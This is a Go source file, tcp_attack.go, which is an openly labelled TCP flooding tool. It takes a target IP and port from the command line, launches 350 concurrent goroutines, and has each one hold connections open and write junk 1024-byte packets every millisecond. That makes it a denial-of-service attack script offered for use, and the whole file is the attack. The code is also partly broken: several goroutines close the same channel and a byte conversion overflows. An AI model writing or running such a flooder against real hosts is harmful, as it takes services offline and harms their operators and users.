package main

import (
	"fmt"
	"net"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

type AttackConfig struct {
	TargetIP      string
	TargetPort    string
	NumConnections int
	Interval      time.Duration
	Timeout       time.Duration
	done          uint32 // флаг, що показує, чи канал вже був закритий
}

func generateFakePacket() []byte {
	packet := make([]byte, 1024)
	for i := range packet {
		packet[i] = byte(i % 3000)
	}
	return packet
}

func attack(config AttackConfig, done chan struct{}) {
	defer close(done)
	for {
		conn, err := net.DialTimeout("tcp", config.TargetIP+":"+config.TargetPort, config.Timeout)
		if err != nil {
			fmt.Println("Error connecting to target:", err)
			time.Sleep(1 * time.Second)
			continue
		}

		// Enable keep-alive
		tcpConn, ok := conn.(*net.TCPConn)
		if !ok {
			fmt.Println("Error converting connection to TCPConn")
			return
		}
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)

		defer conn.Close()

		fmt.Printf("Attacking %s:%s...\n", config.TargetIP, config.TargetPort)

		data := generateFakePacket()
		for {
			_, err := conn.Write(data)
			if err != nil {
				fmt.Println("Error writing to target:", err)
				return
			}
			time.Sleep(config.Interval)
		}
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run tcp_attack.go <ip> <port>")
		return
	}

	ip := os.Args[1]
	port := os.Args[2]

	config := AttackConfig{
		TargetIP:      ip,
		TargetPort:    port,
		NumConnections: 350,
		Interval:      1 * time.Millisecond,
		Timeout:       5 * time.Second,
	}

	done := make(chan struct{})
	var wg sync.WaitGroup
	for i := 0; i < config.NumConnections; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if atomic.LoadUint32(&config.done) == 0 {
				attack(config, done)
			}
		}()
	}

	// Wait for user to stop the attack
	<-done
	atomic.StoreUint32(&config.done, 1)
	wg.Wait()
}
